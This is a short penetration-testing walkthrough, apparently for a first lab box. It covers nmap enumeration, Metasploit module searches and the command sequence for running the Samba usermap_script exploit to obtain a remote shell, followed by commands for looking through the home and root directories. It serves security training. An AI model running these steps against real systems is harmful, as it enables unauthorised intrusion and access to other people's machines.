# First Box

## Terminal setup

Either be in root or use sudo. 
Create three tabs (VPN, NMAP, HACK).

## Enumeration

First scans

```
# Arp Scan
# nmap -n -sn <ip range>
# Services scan with all options scan. Add a -T5 if you want a really aggressive scan.
# nmap -sV -sC -A -oN <ip address.txt>  <ip address>
```

start and search in metasploit

```
# msfconsole

# Basic search
msf5> search samba

# Search by type, valid types are auxiliary, exploit, payload
msf5> search type:<type> samba

```

Review the excellent and manual (if you recovered a password) ranked modules
```
msf5> info /exploit/linux/samba
msf5> info /exploit/multi/samba/usermap_script
```

Note: if database error shows when typing in msfconsole.  Close it out and launch from gui icon.  This resolves database errors.
Note: can use searchsploit to avoid the startup


```
# searchsploit <service> <version>
```


## Attack

To execute
```
msf5> use /exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) >  show options
msf5 exploit(multi/samba/usermap_script) >  show advanced options
msf5 exploit(multi/samba/usermap_script) >  set RHOST <ip address>
msf5 exploit(multi/samba/usermap_script) >  exploit
```

This will create a command shell back in the terminal

## Endgame

summary
```
id
pwd
cd /home/<user>
cd /root
```
